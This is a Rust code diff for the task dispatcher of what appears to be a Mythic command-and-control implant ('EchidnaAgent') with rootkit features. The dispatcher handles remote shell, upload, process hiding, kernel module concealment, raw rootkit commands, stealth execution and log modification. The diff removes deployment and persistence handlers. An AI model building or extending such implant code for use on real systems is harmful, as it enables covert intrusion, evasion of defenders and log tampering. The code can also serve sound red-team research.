@@ -63,21 +63,13 @@ type SpawnCbType = fn(
 ) -> Result<(), Box<dyn Error>>;
 
 impl Tasker {
-    /// Create a new tasker focused on rootkit operations
     pub fn new() -> Self {
         Self {
             background_tasks: Vec::new(),
             completed_tasks: Vec::new(),
             dispatch_val: 0,
             cached_ids: VecDeque::new(),
-            rootkit_manager: None,
         }
-    }
-
-    /// Set reference to rootkit manager (called by EchidnaAgent)
-    /// This is a raw pointer to avoid circular references
-    pub fn set_rootkit_manager(&mut self, manager: *mut RootkitManager) {
-        self.rootkit_manager = Some(manager);
     }
 
     /// Process the pending rootkit-focused tasks
@@ -94,14 +86,63 @@ impl Tasker {
                 // Process tasks which are either background tasks or tasks where messages
                 // need to be sent to an already running background task.
                 match task.command.as_str() {
-                    // Long-running rootkit deployment operations
-                    "deploy" => {
-                        if let Err(e) = self.spawn_background(task, deploy_technique_background, false)
-                        {
+                    "shell" => {
+                        if let Err(e) = self.spawn_background(task, shell::run_cmd, false) {
                             self.completed_tasks
                                 .push(mythic_error!(task.id, e.to_string()));
                         }
                         continue;
+                    }
+
+                    "upload" => {
+                        if let Err(e) = self.spawn_background(task, upload::upload_file, false) {
+                            self.completed_tasks
+                                .push(mythic_error!(task.id, e.to_string()));
+                        }
+                        continue;
+                    }
+
+                    // Rootkit commands - all synchronous since they're quick /proc operations
+                    "hide_process" => {
+                        match rootkit_commands::hide_process(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
+                    }
+                    
+                    "list_hidden" => {
+                        match rootkit_commands::list_hidden_processes(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
+                    }
+                    
+                    "toggle_module" => {
+                        match rootkit_commands::toggle_module_visibility(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
+                    }
+                    
+                    "rootkit_status" => {
+                        match rootkit_commands::get_rootkit_status(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
+                    }
+                    
+                    "rootkit_health" => {
+                        match rootkit_commands::check_rootkit_health(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
+                    }
+                    
+                    "raw_rootkit_cmd" => {
+                        match rootkit_commands::execute_raw_command(task) {
+                            Ok(res) => res,
+                            Err(e) => mythic_error!(task.id, e.to_string()),
+                        }
                     }
 
                     // Background rootkit operations that may take time
@@ -302,31 +343,6 @@ impl Tasker {
     }
 }
 
-/// Background function for rootkit technique deployment
-fn deploy_technique_background(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    // Wait for initial task data
-    let task_data = rx.recv()?;
-    let task: AgentTask = serde_json::from_value(task_data)?;
-
-    // Send initial status
-    let _ = tx.send(crate::mythic_continued!(
-        task.id,
-        "processing",
-        "Starting rootkit deployment..."
-    ));
-
-    // Process deployment (this would normally take significant time)
-    let result = commands::deploy_technique(&task)?;
-
-    // Send final result
-    let _ = tx.send(result);
-
-    Ok(())
-}
-
 /// Background function for stealth command execution
 fn stealth_execute_background(
     tx: &mpsc::Sender<serde_json::Value>,
@@ -370,31 +386,6 @@ fn modify_logs_background(
 
     // Process log modification
     let result = commands::modify_logs(&task)?;
-
-    // Send final result
-    let _ = tx.send(result);
-
-    Ok(())
-}
-
-/// Background function for persistence setup
-fn enable_persistence_background(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    // Wait for initial task data
-    let task_data = rx.recv()?;
-    let task: AgentTask = serde_json::from_value(task_data)?;
-
-    // Send initial status
-    let _ = tx.send(crate::mythic_continued!(
-        task.id,
-        "processing",
-        "Setting up persistence mechanisms..."
-    ));
-
-    // Process persistence setup
-    let result = commands::enable_persistence(&task)?;
 
     // Send final result
     let _ = tx.send(result);
